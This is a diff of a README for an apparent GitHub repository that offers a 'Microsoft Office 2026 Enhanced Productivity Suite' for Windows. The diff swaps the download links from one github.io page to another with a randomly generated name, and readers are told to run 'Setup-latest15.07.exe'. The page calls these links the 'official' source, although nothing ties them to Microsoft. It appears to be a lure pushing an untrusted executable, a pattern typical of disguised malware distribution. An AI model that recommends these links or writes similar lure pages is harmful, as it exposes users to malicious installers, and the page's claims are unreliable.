@@ -2,7 +2,7 @@
 
 This repository provides the Microsoft Office 2026 Enhanced Productivity Suite, a comprehensive tool designed to enhance your Office experience on Windows 10 and 11. With advanced customization options and optimization features, this suite helps you boost efficiency and personalize your workflow, making it an essential addition for users seeking to maximize their productivity.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside
 
@@ -70,7 +70,7 @@ These answers should help resolve most issues, but if you have further questions
 
 To get started with the Microsoft Office 2026 Enhanced Productivity Suite, download the latest version from the official GitHub page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This link provides the most recent installer and ensures you have access to all updates and features. Remember to verify the file name "Setup-latest15.07.exe" for authenticity.
 
